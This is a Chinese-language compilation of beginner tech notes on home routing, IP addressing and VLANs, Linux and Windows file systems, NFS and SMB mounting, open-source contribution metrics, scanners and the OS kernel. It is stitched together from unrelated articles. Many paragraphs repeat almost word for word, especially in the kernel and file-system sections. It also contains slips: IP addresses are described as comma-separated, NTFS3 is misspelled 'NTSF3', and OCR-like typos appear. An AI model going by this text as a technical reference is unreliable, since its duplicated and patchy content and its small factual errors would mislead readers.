单臂路由：路由和光猫处于同一个局域网（连接到同一个交换机），可以通过路由拨号（就类似你可以用局域网任意电脑拨号）。因为 wan 口和局域网是在同一个网络，所以路由器支持物理端口复用（wan 和 lan共用一个物理端口时）也可以相互访问。这个方案可以使用比较廉价的傻瓜交换机。（虽然也要一台高级路由器）

两台电脑怎么可以通信？只需要链接一根网线，然后设置 ip 地址，即可。ip 地址是一种网络协议下的通信地址，它有如下形式： 192.168.0.1。

它有逗号分隔的4组数字，从0~255之间。这些数字不是瞎填，全世界那么多网络设备，就靠这个ip地址来定位，所以有相关的世界性规范来分配地址。而家庭网络属于局域网，一般是192.168.x.x 网段。

ip 地址是有网络和主机的概念的，只有处于同一个网络的主机，才能相互通信。如 192.168.1.100， 192.168.1 是一个网络， 后面的 100 是主机标识。是不是所有网络都是前三组数字？并不是，它是通过一个叫掩码的东西决定的，形式类似 255.255.255.0 ，这数字有点看不懂，其实要看它的二进制，在电脑中就是1111...0000 这种，经过位运算“与”，就会保留前面三组数字，后面一组清零。

电脑和电脑一对一，端口有限，如果三个电脑怎么相互链接？要买个新往网卡嘛？这样链接的复杂度会是 n 的 2 次方。

这时可以使用一个叫交换机的独立设备。你可以把交换机看作一个实现端口间两两连接的设备。只需要将原本插入到另一个电脑的网线，插在交换机的任意端口上即可。

192.168.0.1 要访问 192.168.1.1 怎么办？这种跨网络的访问需要一个中介。中介拥有两个网口， 一个处于 192.168.0 网络（如主机号 2）， 一个处于 192.168.1（如主机号 5）。这个中介配置了转发功能，相当于桥梁的作用（网桥）。然后 192.168.0.1 这个主机，就可以这样配置网关： 192.168.0.2。

现实设备中，网关由路由器实现，它同时也是一台交换机，只是一般只有一个 wan 口，连接上级设备，有 n 个 lan 口，连接本地网络，这部分也相当于本地的交换机。

路由器这种设计，它主要是为了让wan口链接外网，也就是上级电信网络的服务器。一般只有一条网线到户，所以不需要那么多 wan 口。

我们上网，并不使用 ip 地址，而是使用网址。但实际上网址首先得翻译成 ip 地址，才能实现通信。而将 ip 和 网址一一对应，并提供翻译服务的服务器，就叫 DNS 服务器。 dhcp 服务器一般也会将正确的 dns 服务器的地址配置好。如果没有配置 dns 服务器，那么本地主机会将网关视为 dns 服务器，由网关向上级网络提交 dns 翻译请求。

注意 dns 不是路由器的功能，而只是一个配置项。dns 服务器一般设置在电信，因为路由器的 wan 口通过电信服务器的 dhcp 获取了 ip / dns 的配置信息，所以它可以将这些信息再通过自身的 dhcp 服务给本地网络做配置。

路由器和上级电信服务器，很多时候并不是通过通常的 dhcp 分配ip 手段来实现链接的。因为电信他要帐号，他要收你的钱，所以就有一个验证的过程。总而言之，就有个拨号的过程，只有拨号成功了，你才能获得公网的 ip 地址，才能访问外网（可以将外网看作一个超大的网络，主机容量数以亿计）。

拨号技术有很多种，常见的有 pppoe。

电信一般会给你提供一台光猫，光猫本身也是路由器，但性能比较弱，端口比较少，所以下面一般会再接自己的路由器。光猫和普通路由器的区别，它的 wan 口是连接光纤的，具备将光信号转换成电信号的能力，具备这种能力也叫调制解调器，也就是所谓的 modem（音译猫）的来由。

vlan 是虚拟 lan 口的意思，它的作用就是让一个端口，具备多个逻辑 lan 口的功能，也就是所谓的单线复用。

vlan 在网络技术栈中，属于二层，路由属于上层（三层）。它属于交换机这种设备，但是并不是所有交换机都配置这个功能。

802.1Q vlan: 这类 vlan 技术对数据帧进行修改，添加 vlan 标识（如vlan 3)，对应端口收到数据帧，对其进行识别，无效的丢弃，属于自己的保留。也就是各个端口要在同一个 vlan 网络，只需要配置相同的 vlan id 即可。

标题：常见文件系统简介
文件系统是对一个存储设备上的数据和元数据进行组织的机制。它的最终目的是把大量数据有组织的放入持久性(persistant)的存储设备中，比如硬盘和磁盘。文件系统(file system)是就是文件在逻辑上组织形式，它以一种更加清晰的方式来存放各个文件。数据被存入到某个分区中。

Windows当前的默认文件系统，NTFS文件系统是一个基于安全性的文件系统，是Windows NT所采用的独特的文件系统结构，它是建立在保护文件和目录数据基础上，同时照顾节省存储资源、减少磁盘占用量的一种先进的文件系统。

NTFS是Windows当前的默认文件系统，NTFS文件系统是一个基于安全性的文件系统，是Windows NT所采用的独特的文件系统结构，它是建立在保护文件和目录数据基础上，同时照顾节省存储资源、减少磁盘占用量的一种先进的文件系统。

Ext系列是Linux的老牌文件系统了，一直是Linux的主打，从Ext3开始支持日志，Ext4更加完善了很多功能。由于其组织形式的限制，很难将很多现代文件系统的功能加进去，所以Linux才会出Btrfs项目企图重头开发一个功能强劲的文件系统。

Ext系列是Linux的老牌文件系统了，一直是Linux的主打，从Ext3开始支持日志，Ext4更加完善了很多功能。

BTRFS（通常念成Butter FS），由Oracle于2007年宣布并进行中的COW(copy-on-write式)文件系统。目标是取代Linux ext3文件系统，改善ext3的限制，特别是单一文件大小的限制，总文件系统大小限制以及加入文件校验和特性。加入ext3/4未支持的一些功能，例如可写的磁盘快照(snapshots)，以及支持递归的快照(snapshots of snapshots)，内建磁盘阵列（RAID）支持，支持子卷(Subvolumes)的概念，允许在线调整文件系统大小。

BTRFS由Oracle于2007年宣布并进行中的COW(copy-on-write式)文件系统。目标是取代Linux ext3文件系统，改善ext3的限制，特别是单一文件大小的限制，总文件系统大小限制以及加入文件校验和特性。

被称为真正的下一代文件系统，ZFS 提供卷管理（能够在单个文件系统中处理多个单独的存储设备），块级加密校验和（允许以极高的准确率检测数据损坏），自动损坏修复（其中冗余或奇偶校验存储可用），快速异步增量复制，内联压缩等，以及更多。

linux 可以实现在一个根系统下，挂载多个文件系统。比如：双系统中 /media 目录下挂载 NTFS文件系统，/mnt 目录下，挂载U盘的文件系统。

Linux支持的 文件系统有上百种，难道Linux内核需要对上百种一一适配吗？不需要。为了支持各种不同的文件系统，Linux 内核在用户进程和文件系统的中间，又引入了一个抽象层，也就是虚拟文件系统 VFS（Virtual File System）。VFS 定义了一组所有文件系统都支持的数据结构和标准接口。这样，用户进程和内核中的其他子系统，只需要跟 VFS 提供的统一接口进行交互就可以了，而不需要再关心底层各种文件系统的实现细节。

根文件系统首先是一种文件系统，相对于普通的文件系统，它的特殊之处在于，它是内核启动时所挂载（mount）的第一个文件系统，内核代码的映像文件保存在根文件系统中，系统引导启动程序会在根文件系统挂载之后从中把一些初始化脚本（如rcS,inittab）和服务加载到内存中去运行。

在 Linux 中将一个文件系统与一个存储设备关联起来的过程称为挂载（mount）。使用 mount 命令将一个文件系统附着到当前文件系统层次结构中（根）。在 Linux 系统启动阶段的最初阶段，root 文件系统就会被挂载到 root 目录下（/）。其它文件系统在之后通过 SystemV 下的 rc 或更新一些的 Linux 发行版中的 systemd 等 Linux 启动程序挂载。在启动进程中文件系统的挂载是由 /etc/fstab 配置文件管理的。

首先，在Linux下谈分区并不准确。与Windows分区，一个分区一个盘符不同。Linux是一整个目录树，Linux先划分固定大小的磁盘空间，设置好文件系统后，将磁盘空间挂载到固定目录下。

为什么要分区？数据安全：在不损失数据的情况下重装系统，比如独立设置 /home 挂载点，重装系统的时候直接标记回 /home，数据不会有任何损失。效率（机械硬盘）：将数据集中在某个分区，读取数据时，硬盘只会搜索相应区段，提升读取速度。

关于/usr分区，多说一句，因为我经常搞机，重装比较多，如果单独划分 /usr分区，装完系统，直接挂载就可以使用以前的数据啦。如果你是普通用户，可以不分此目录。但 建议把 根目录 分得大一点，其他的空间给 /home 分区。

标题：开源软件社区开发者的贡献评估方法研究（摘要）
开源软件项目的特点是自组织性和动态性；来自世界各地的开发者对开源项目的贡献出自他们自己的意愿而不是实际奖励，让项目拥有者理解项目中成员的角色是个重要的问题。大型项目判断标准：成百上千名开发者。

软件仓库挖掘（Mining Software Repository，MSR）：是针对软件资源挖掘的领域，所涉及的资源包括：源代码、配置文件、静态资源、脚本、版本管理日志记录等。这些资源会被版本控制系统记录，常用的版本控制系统包括 Git 和 SVN。当前 MSR 主要有几个方向：（1）借助版本管理控制系统的历史操作日志记录，从中提取出有价值的信息，利用数据分析技术在基础上发现一些规律、构造度量方案，如软件质量、开发者贡献的度量。（2）实证研究开源社区的相关现象和规律，通过假设检验方法验证相关结论是否有统计和现实意义。（3）基于机器学习、数据挖掘的技术对软件仓库中的某些信息进行预测，如预测缺陷问题的优先级、缺陷的紧急度、缺陷修复最优指派人、代码审阅人等。

新加入的开发人员成为长期贡献者的概率与他的意愿和环境更多的相关，而不是一开始的能力，通常来说，未来的长期贡献者在加入的第一个月内会表现得更加活跃，会更多的参与交流。

在实际开发过程中，代码提交次数可以很好的表达一个开发者的活跃情况，越活跃的开发者在代码增加、删除和修复 bug、更改文件等活动上能获得更多的机会，因此贡献也会相对较大；代码改变较多但是涉及文件数量很少的贡献者一般为核心开发者，在维护某些文件上贡献极大，同时项目管理者要特别注意这类人，预防此类开发者离开项目所造成的某些文件短时间内缺少人维护的状态。

适用于大型项目的规律：3 个可用于度量开发者贡献的变量，它们分别是开发者增加代码的行数、修复缺陷的数量、参与评论的次数。

在衡量一个开发者的贡献时候应该着重考虑它们修复缺陷的能力以及交流沟通的能力，代码行数这个指标比较复杂，涉及到项目中新功能的增加、已有功能的完善、缺陷的修复等，也是应该被重点考虑的，在同一项目中，所用编程语言和框架是固定的，因此代码的增加可以用来衡量开发者的水平，进而体现在贡献上。

在大型开源软件项目中，因为贡献者的数量比较多，在整体看贡献的时候，个人的贡献容易被平均，通过上节和本节的研究可以看出高贡献者推动了项目的发展，但是大量外围开发者的整体累积贡献也是推动项目发展的因素。一些核心开发者可能会负责一些具体的任务，导致开发者在某些观测变量上持续而长时间的进行贡献，其贡献有明显的倾向性，而外围贡献开发者的参与开源软件的贡献具有随机性，通过 Pull Request 向代码仓库做贡献，一般会伴随缺陷的修复。

在度量一个开发者的贡献时候，可以重点关注下面的指标：提交代码次数、增加代码行数、删除代码行数、修复缺陷的数量、发布问题数量和评论次数这6 项指标。

90%以上的开发者属于外围贡献者，其贡献没有太多可预测的，一般基于某些事件，带有比较多的随机性，他们进入项目的时间和离开项目的时间也很难预测，可能存在某个版本，也可能间隔的出现。

在活跃开发者中，存在不同形式的贡献规律，贡献偏向也有不同的类型。一部分开发者在源代码重构上具有很高贡献，会接触大量的项目文件，有些贡献者倾向于贡献少数核心文件，对维护这些文件起着非常大的作用，而部分开发者会倾向于社交，在评论上会有大量记录，和一般用户接触比较多。这也是每个开发者身份不同，导致的贡献偏好不同。

所有开发者不是孤立存在的。在开发过程中必然需要和其他开发者或者用户产生交流，分析代码提交量前 10 的开发者，都有不同程度的交流过程，相反，低贡献者中很少有在社区表现活跃的情况。

在整个开发过程少数精英主导，即是说整个软件演化节奏由持续贡献的几个核心开发者的活动所推动，当项目精英离开团队时候，如果没有其他人接手，项目将处于停滞演化状态。绝大多数外缘开源软件开发人员的参与具有随机性。可能基于某种事件，极少数人可以发展成为长期贡献者，长期贡献的特性在于从开始进入就基本不出现惰性时期，我们可以重点注意那些在 2 个或 2 个版本以上有贡献的开发者，指导项目拥有者合理配置开发人员。通过对开发者们的贡献演化分析，我们可以对项目中的开发者进行分类，按照角色划分，可以分为项目拥有者、核心贡献者、外围贡献者、基础用户。项目拥有者通常表现在有通过代码关闭某一问题的权限，同时在发布问题上要高出其他开发者很多。核心贡献者通常来说是贡献提交数量排前列的，他们的贡献时间上比较稳定，会产生持续贡献。外围贡献者可以理解为对项目感兴趣的研究者或者重度用户，他们在实际中遇到问题并解决然后反馈给开源项目和社区，但是这个贡献具有很大的随机性，也会间断式的出现。基础用户对项目的贡献主要体现在发现bug，其在代码上的贡献基本没有，但是会推动项目的发展。从整个项目周期中出现的所有开发者的全貌来看，核心开发者不足整个项目 1%，绝大部分的开发者是外围贡献者，在评价单个外围开发者的贡献量时候比较困难，但是他们整体的贡献无疑是值得肯定的。

标题：扫描仪是什么?
扫描仪（scanner）是一种捕获影像的装置，作为一种光机电一体化的电脑外设产品，可将影像转换为计算机可以显示、编辑、存储和输出的数字格式，是功能很强的一种输入设备。将美术图形和照片扫描结合到文件中；将印刷好的文本扫描输入到文字处理软件中，免去重新打字之麻烦；将传真文件扫描输入到数据库软件或文字处理软件中存储；在多媒体产品中添加图像。

标题：操作系统的内核到底是什么？
本质上内核是对计算机硬件的抽象。这样说是因为这里涉及到一个更根本的问题：人机交互。如何让计算机理解人的想法，需求，并将之实现。比如：让计算机计算一下硬盘中的一个文档的字数。我们是没有办法去打开“硬盘”翻箱倒柜找到这个文件，然后丢给“CPU”去统计，并从“CPU”那里得到这个结果。对于计算机内部真正的核心组成部分：CPU、硬盘、内存等等这些硬件，人是无法直接去面对和交互的。而计算机处理的所有工作，都是通过调用这些硬件设备来完成的。对操作系统来说，最重要的正是管理和调度计算机内部的资源。而具体到操作系统的内部分工，则是由内核来真正完成和执行的。除了内核以外，操作系统其他所有的部件，都不需要也不关注如何计算、如何存储、如何和具体的某个硬件设备打交道。所有的部件都只需要将具体的诉求传递给内核，调用内核的接口，即可完成硬件资源的调度和使用。内核抽象了计算机内部硬件资源，并统一管理对外提供支持，所以内核 = 计算机硬件。

具体到内核内部的组成部分和抽象结构，内核的核心功能和硬件有如下对应和抽象关系：进程管理 —— CPU；内存管理 —— 内存；虚拟文件系统 —— 硬盘/磁盘；网络接口 —— 网卡。

既然硬件是由内核去管理和调度的，那么内核又是如何做到的呢？从内核的代码量上来说，内核的绝大部分代码是驱动，各个不同设备不同硬件的驱动。驱动是内核和硬件设备之间的桥梁，内核也正是通过驱动来管理和调度硬件设备。

除了驱动以外，内核的另外一部分是各种算法、函数、策略，但是代码量较少。这一部分确实有价值，但是并非唯一无可替代，也并非具有卡脖子的门槛存在。内核真正的价值是其本身涵盖的生态 —— 各种驱动和硬件的适配，日积月累的沉淀。对内核来说，真正关键和重要的是如何保证在更多甚至每一个设备上都能运行。算法和技术的难度形成的门槛，远远比不上日积月累的时间所形成的门槛。使用Linux内核，最大的原因是复用和继承Linux的生态。而且，Linux开源的内核现在的主要演进工作也是生态的扩大。比如最新发布的Linux原生内核5.15就有如下几个重点更新：1、集成Paragon Software 的 NTSF3 driver；2、支持AMD 的GPU/CPU；3、支持apple M1芯片；4、支持Intel 12代CPU；5、支持Intel DG2显卡。

Linux 内核主要的变化点概括来说有如下三点：新技术新协议的支持、自身算法和策略的优化和bug修复、新硬件新设备的驱动集成和支持。其中第一点和第三点都是为扩大和维护软件和硬件的生态。而做国产操作系统最重要的一点也是如此，扩大和支持国产硬件的生态。所以使用Linux开源内核，而不去自研一套，“非不能也，实不为也”。生态的打造是日积月累，沉淀之功，即便是国产硬件的生态支持也不是一日之功。集成和使用Linux内核是成本最低，效用最大，且行之有效的策略。

如果一个操作系统有更高的目的和使命，那么继承和复用只是基础。更重要的如何去掌握、主导和发展，走自己的路，满足自己的需求，这一点对国产操作系统更是如此。Linux开源内核没有适配和支持国内的硬件生态，需要自己来兼容和适配，支持这个生态的发展。Linux开源内核没有考虑的国内使用环境和安全要求，需要自己来投入和满足，保护自己。

每次谈到什么是内核，就是：进程调度、内存管理、文件系统、网络接口、进程通信等等这些。然后就是内核态、用户态等等。这些其实都对，但是始终感觉没法让人直观的知道，内核到底是个什么东西。本质上内核是对计算机硬件的抽象。

这样说是因为这里涉及到一个更根本的问题：人机交互。如何让计算机理解人的想法，需求，并将之实现。比如：让计算机计算一下硬盘中的一个文档的字数。我们是没有办法去打开“硬盘”翻箱倒柜找到这个文件，然后丢给“CPU”去统计，并从“CPU”那里得到这个结果。对于计算机内部真正的核心组成部分：CPU、硬盘、内存等等这些硬件，人是无法直接去面对和交互的。而计算机处理的所有工作，都是通过调用这些硬件设备来完成的。

对操作系统来说，最重要的正是管理和调度计算机内部的资源。而具体到操作系统的内部分工，则是由内核来真正完成和执行的。除了内核以外，操作系统其他所有的部件，都不需要也不关注如何计算、如何存储、如何和具体的某个硬件设备打交道。所有的部件都只需要将具体的诉求传递给内核，调用内核的接口，即可完成硬件资源的调度和使用。内核抽象了计算机内部硬件资源，并统一管理对外提供支持，所以内核 = 计算机硬件。具体到内核内部的组成部分和抽象结构，内核的核心功能和硬件有如下对应和抽象关系：进程管理 —— CPU，内存管理 —— 内存，虚拟文件系统 —— 硬盘/磁盘，网络接口 —— 网卡。

既然硬件是由内核去管理和调度的，那么内核又是如何做到的呢？从内核的代码量上来说，内核的绝大部分代码是驱动，各个不同设备不同硬件的驱动。驱动是内核和硬件设备之间的桥梁，内核也正是通过驱动来管理和调度硬件设备。除了驱动以外，内核的另外一部分是各种算法、函数、策略，但是代码量较少。

使用Linux内核，最大的原因是复用和继承Linux的生态。而且，Linux开源的内核现在的主要演进工作也是生态的扩大。比最新发布的Linux原生内核5.15就有如下几个重点更新：1、集成Paragon Software 的 NTSF3 driver，2、支持AMD 的GPU/CPU，3、支持apple M1芯片，4、支持Intel 12代CPU，5、支持Intel DG2显卡。

Linux 内核主要的变化点概括来说有如下三点：新技术新协议的支持、自身算法和策略的优化和bug修复、新硬件新设备的驱动集成和支持。其中第一点和第三点都是为扩大和维护软件和硬件的生态。而做国产操作系统最重要的一点也是如此，扩大和支持国产硬件的生态。所以使用Linux开源内核，而不去自研一套，“非不能也，实不为也”。生态的打造是日积月累，沉淀之功，即便是国产硬件的生态支持也不是一日之功。

标题：文件系统类型入门
文件系统是指数据的组织方式，定义数据在磁盘上的保存、读取和更新方法。不同的文件系统可以根据存储设备的不同进行优化，提高效率。文件系统简单的按类型可分：本地文件系统、网络文件系统。Linux 内核支持诸多文件系统，可以让我们从一系列特性中选择以适用于个人的特殊需要。所幸大多数默认文件系统种类都能满足你的任何需要。一些文件系统专为特殊介质设计，如 iso9660 文件系统一般只能用于 CD 和 DVD 介质。

非日志文件系统：传统的文件系统，不带日志功能。Ext：第一个专门为Linux的文件系统类型，叫做扩展文件系统。它在1992年4月完成的。它为Linux的发展取得了重要作用。但是在性能和兼容性上存在许多缺陷。现在已经很少使用了。Ext2 ：与其他文件系统相比，ext2 十分简单化，它比大多数其他文件系统在读写数据时要快。但并未包含日志功能。这意味着在一次硬性崩溃后，必须彻底检查文件系统以发现和修复（可能的话）错误。

Minix ：Linux支持的第一个文件系统，对用户有很多限制而且性能低下。有些没有时间标记，其文件名最长14个字符。minix 文件系统最大的缺点是最大只能使用64M 的硬盘分区，所以在目前已经没有人使用它了。Xia ：Minix文件系统修正后的版本。在一定程度上解决了文件名和文件系统大小的局限。但没有新的特色，目前很少有人使用。Msdos ：是在Dos、Windows和某些OS/2 操作系统上使用的一种文件系统，其名称采用“8+3”的形式，即8个字符的文件名加上3个字符的扩展名。

umsdos ：Linux下的扩展msdos文件系统驱动，支持长文件名、所有者、允许权限、连接和设备文件。允许一个普通的msdos文件系统用于Linux，而且无须为它建立单独的分区。Vfat ：是Windows9x 和 Windows NT/2000下使用的一种Dos文件系统，其在 Dos 文件系统的基础上增加了对长文件名的支持。iso9660 ：是专门为光学介质（如 CD 和 DVD）设计的文件系统。因为光学磁盘是只读介质，Linux 内核甚至没有包括对该文件系统的写入支持。为创建一个 iso9660 文件系统，你必需使用用户级工具，如 mkisof(8) 或 growisfs(8)。

FAT16 ：是一种16位的文件分配表，用来对磁盘（软盘、硬盘、U盘等）进行分区，以前用的软盘大多采用FAT格式，windows98 、windows ME 之前的操作系统也采用这种格式。FAT32：是Windows系统硬盘分区格式的一种。这种格式采用32位的文件分配表，使其对磁盘的管理能力大大增强，突破了FAT16对每一个分区的容量只有2 GB的限制。

ext3 ：ext3 与 ext2 相似，它的设计目的是在大多数情况下取代 ext2。ext3 和 ext2 的底层代码基本相同，但加入了日志支持。实际上 ext3 与 ext2 非常相像，可以直接快捷地将其中一种转为另一种而不会丢失数据。因为这些，ext3 十分流行。在突然的硬件故障时也有许多用来恢复数据的工具。ext3 是一个用于一般用途且带有日志功能的不错的文件系统。但在一些特殊情况下没有不如其他的日志文件系统表现得那么好。ext3 这种文件系统的一个缺陷就是仍需时常进行彻底检查。一般是在挂载文件系统时，通常为开机时，会造成讨厌的延迟。

ext4 ： 是 ext 系列文件系统中最新的一个。它基于 ext3 设计，并加入了文件系统应该能做什么的一些理念。尽管当前主流操作系统都支持 ext4，你应该记住这种文件系统仍然很新（尤其是从文件系统方面来说）。如果你觉得稳定性比性能更重要，你可能会选择其他的文件系统，如 ext3。说完这些，我们来说 ext4 的确声称比 ext3 在性能角逐方面有很大的提升，但是许多人在稳定使用方面仍不相信它。reiserfs ： 是 Linux 内核支持得最久的日志文件系统之一。它是一种非常快速的文件系统，非常适合多个小文件的存储、读取及写入。遗憾的是，reiserfs 在驱动器出现问题时恢复工具很少，且比 ext3 崩溃更频繁。

XFS ： 是由 SGI 贡献到 Linux 内核的，是处理大分卷和文件的最好的文件系统之一。XFS 比其他文件系统使用更多的 RAM。但是如果你需要处理大文件，其性能足以弥补内存使用方面的不足。XFS 在桌面及笔记本的使用上也不一定不适合，而且它在需要整天处理大文件的服务器上表现得确实很好。与 ext3 类似，XFS 是完全的日志文件系统。Btrfs ：通常念成Butter FS，由Oracle于2007年宣布并进行中的COW(copy-on-write式)文件系统。目标在取代Linux目前的ext3文件系统，改善ext3的限制，特别是单一文件的大小，总文件系统大小及加入文件校验和。加入目前ext3/4未支援的功能，例如可写的磁盘快照(snapshots)，以及支持递归的快照(snapshots of snapshots)，内建磁盘阵列（RAID）支援，支持子卷(Subvolumes)的概念，支持在线调整文件系统大小。

JFS ： 是由 IBM 贡献至 Linux 内核的，在极限状况下的反应速度使其很有名。它可以横跨巨大的分卷，这使其适用于网络附加存储（Network Attached Storage，NAS）设备。JFS 的长久历史及彻底的测试使其成为 Linux 下最可靠的日志系统之一。vfat ：有时你可能需要在 Windows 和 Linux 之间共享数据，却不能通过网络进行传输。这时你需要一个共享分区或是 USB 闪存驱动器。不起眼的 vfat 文件系统在这里却是最好的选择，因为它被各种各样的操作系统支持。遗憾的是，作为微软设计的文件系统，它与传统的 Linux 文件系统储存权限的方式不同。这意味着需要使用特殊的选项来让多个用户读取该文件系统上的数据。

网络文件系统（Network File System，NFS），一种使用于分散式文件系统的协议，由sun公司开发，于1984年向外公布。功能是通过网络让不同的机器、不同的操作系统能够彼此分享个别的数据，让应用程序在客户端通过网络访问位于服务器磁盘中的数据，是在Unix系统间实现磁盘文件共享的一种方法。NFS 的基本原则是“容许不同的客户端及服务端通过一组RPC分享相同的文件系统”，它是独立于操作系统，容许不同硬件及操作系统的系统共同进行文件的分享。

NFS提供了以下的服务：在目录（directory）中查找文件、列出目录中的文件、管理目录、取得各文件的属性（file attribute）、文件的读／写。NFS于1984年由升阳公司推出不久即广为业界及学术界所接受。尽管当时不同的大学及实验室已研发了多种分布式文件系统，然而 NFS 是第一个能够于学术及商业上成功应用的产品。其后升阳为了使 NFS 成为一种标准，于1989年正式公开发布其接口，使得更多厂商能够把 NFS 加入其产品之中。2000年推出的第四版NFS，受到OpenAFS与SMB的影响很大。

挂载 NFS 共享与挂载本地文件系统稍有不同。不是指定一个本地设备，而是需要告诉 mount NFS 服务器的域名或 IP 地址，以及要挂载的目录，中间用一个冒号隔开。例如：mount -t nfs darkstar.example.com:/home /home。Samba，是种用来让UNIX系列的操作系统与微软Windows操作系统的SMB/CIFS（Server Message Block/Common Internet File System）网络协定做连结的自由软件。目前的版本（v3）不仅可存取及分享SMB的资料夹及打印机，本身还可以整合入Windows Server的网域，扮演为网域控制站（Domain Controller）以及加入Active Directory成员。

连接到 SMB 共享（samba shares）十分直接。遗憾的是，SMB 的支持度没有 NFS 那么好，但它还是提供了与 Windows 主机的良好性能和连接性。因此，SMB 是部署在局域网的文件共享协议。挂载 SMB 共享很简单，与 NFS 共享十分相似。你可以用同样的方式告诉 mount 在哪里找到服务器和及想要读取哪个共享。另外，你必须指定一个用户名和密码。例如：# mount -t cifs  darkstar/home /home -o username=alan,password=secret。在 Linux 内核的较老版本中，用的是 smbfs，后来被性能更好、更安全的 cifs 驱动所取代。

本地文件系统文件系统细分还可以分为：非日志文件系统：传统的文件系统，不带日志功能。日志文件系统：指在文件系统发生变化时，先把相关的信息写入一个被称为日志的区域，然后再把变化写入主文件系统的文件系统。在文件系统发生故障（如内核崩溃或突然停电）时，日志文件系统更容易保持一致性，并且可以较快恢复。

非日志文件系统 Ext：第一个专门为Linux的文件系统类型，叫做扩展文件系统。它在1992年4月完成的。它为Linux的发展取得了重要作用。但是在性能和兼容性上存在许多缺陷。现在已经很少使用了。Ext2 ：与其他文件系统相比，ext2 十分简单化，它比大多数其他文件系统在读写数据时要快。但并未包含日志功能。这意味着在一次硬性崩溃后，必须彻底检查文件系统以发现和修复（可能的话）错误。Minix ：Llnux支持的第一个文件系统，对用户有很多限制而且性能低下。有些没有时间标记，其文件名最长l 4个字符。minix 文件系统最大的缺点是最大只能使用64M 的硬盘分区，所以在目前已经没有人使用它了。Xia ：Minix文件系统修正后的版本。在一定程度上解决了文件名和文件系统大小的局限。但没有新的特色，目前很少有人使用。Msdos ：是在Dos、Windows和某些OS/2 操作系统上使用的一种文件系统，其名称采用“8+3”的形式，即8个字符的文件名加上3个字符的扩展名。umsdos ：Linux下的扩展msdos文件系统驱动，支持长文件名、所有者、允许权限、连接和设备文件。允许一个普通的msdo s文件系统用于Linux，而且无须为它建立单独的分区。Vfat ：是Windows9x 和 Windows NT/2000下使用的一种Dos文件系统，其在 Dos 文件系统的基础上增加了对长文件名的支持。iso9660 ：是专门为光学介质（如 CD 和 DVD）设计的文件系统。因为光学磁盘是只读介质，Linux 内核甚至没有包括对该文件系统的写入支持。为创建一个 iso9660 文件系统，你必需使用用户级工具，如 mkisof(8) 或 growisfs(8)。FAT16 ：是一种16位的文件分配表，用来对磁盘（软盘、硬盘、U盘等）进行分区，以前用的软盘大多采用FAT格式，windows98 、windows ME 之前的操作系统也采用这种格式.FAT32：是Windows系统硬盘分区格式的一种。这种格式采用32位的文件分配表，使其对磁盘的管理能力大大增强，突破了FAT16对每一个分区的容量只有2 GB的限制

日志文件系统 ext3 ：ext3 与 ext2 相似，它的设计目的是在大多数情况下取代 ext2。ext3 和 ext2 的底层代码基本相同，但加入了日志支持。实际上 ext3 与 ext2 非常相像，可以直接快捷地将其中一种转为另一种而不会丢失数据。因为这些，ext3 十分流行。在突然的硬件故障时也有许多用来恢复数据的工具。ext3 是一个用于一般用途且带有日志功能的不错的文件系统。但在一些特殊情况下没有不如其他的日志文件系统表现得那么好。ext3 这种文件系统的一个缺陷就是仍需时常进行彻底检查。一般是在挂载文件系统时，通常为开机时，会造成讨厌的延迟。ext4 ： 是 ext 系列文件系统中最新的一个。它基于 ext3 设计，并加入了文件系统应该能做什么的一些理念。尽管当前主流操作系统都支持 ext4，你应该记住这种文件系统仍然很新（尤其是从文件系统方面来说）。如果你觉得稳定性比性能更重要，你可能会选择其他的文件系统，如 ext3。说完这些，我们来说 ext4 的确声称比 ext3 在性能角逐方面有很大的提升，但是许多人在稳定使用方面仍不相信它。reiserfs ： 是 Linux 内核支持得最久的日志文件系统之一。它是一种非常快速的文件系统，非常适合多个小文件的存储、读取及写入。遗憾的是，reiserfs 在驱动器出现问题时恢复工具很少，且比 ext3 崩溃更频繁。XFS ： 是由 SGI 贡献到 Linux 内核的，是处理大分卷和文件的最好的文件系统之一。XFS 比其他文件系统使用更多的 RAM。但是如果你需要处理大文件，其性能足以弥补内存内存使用方面的不足。XFS 在桌面及笔记本的使用上也不一定不适合，而且它在需要整天处理大文件的服务器上表现得确实很好。与 ext3 类似，XFS 是完全的日志文件系统。Btrfs ：通常念成Butter FS，由Oracle于2007年宣布并进行中的COW(copy-on-write式)文件系统。目标在取代Linux目前的ext3文件系统，改善ext3的限制，特别是单一文件的大小，总文件系统大小及加入文件校验和。加入目前ext3/4未支援的功能，例如可写的磁盘快照(snapshots)，以及支持递归的快照(snapshots of snapshots)，内建磁盘阵列（RAID）支援，支持子卷(Subvolumes)的概念，支持在线调整文件系统大小。JFS ： 是由 IBM 贡献至 Linux 内核的，在极限状况下的反应速度使其很有名。它可以横跨巨大的分卷，这使其适用于网络附加存储（Network Attached Storage，NAS）设备。JFS 的长久历史及彻底的测试使其成为 Linux 下最可靠的日志系统之一。vfat ：有时你可能需要在 Windows 和 Linux 之间共享数据，却不能通过网络进行传输。这时你需要一个共享分区或是 USB 闪存驱动器。不起眼的 vfat 文件系统在这里却是最好的选择，因为它被各种各样的操作系统支持。遗憾的是，作为微软设计的文件系统，它与传统的 Linux 文件系统储存权限的方式不同。这意味着需要使用特殊的选项来让多个用户读取该文件系统上的数据。Hpfs ：High Performance File System（HPFS） 高性能文件系统（HPFS） HPFS是Microsoft的LAN Manager中的文件系统，同时也是IBM的LAN Server和OS／2的文件系统。HPFS能访问较大的硬盘驱动器，提供更多的组织特性并改善了文件系统的安全特性。Sysv ：System V/Coherent 在Linux平台上的文件系统。Proc ：Linux 系统中作为一种伪文件系统出现的，它用来作为连接内核数据结构的界面。

网络文件系统 Linux 还支持许多网络文件系统（客户端和服务器），这可以让我们在多个电脑之间透明地共享数据。我们会讨论两个常见的网络文件系统：NFS 和 SMB。NFS 网络文件系统（Network File System，NFS），一种使用于分散式文件系统的协议，由sun公司开发，于1984年向外公布。功能是通过网络让不同的机器、不同的操作系统能够彼此分享个别的数据，让应用程序在客户端通过网络访问位于服务器磁盘中的数据，是在Unix系统间实现磁盘文件共享的一种方法。NFS 的基本原则是“容许不同的客户端及服务端通过一组RPC分享相同的文件系统”，它是独立于操作系统，容许不同硬件及操作系统的系统共同进行文件的分享。NFS 提供了以下的服务：在目录（directory）中查找文件、列出目录中的文件、管理目录、取得各文件的属性（file attribute）、文件的读／写。NFS于1984年由升阳公司推出不久即广为业界及学术界所接受。尽管当时不同的大学及实验室已研发了多种分布式文件系统，然而 NFS 是第一个能够于学术及商业上成功应用的产品。其后升阳为了使 NFS 成为一种标准，于1989年正式公开发布其接口，使得更多厂商能够把 NFS 加入其产品之中。NFS 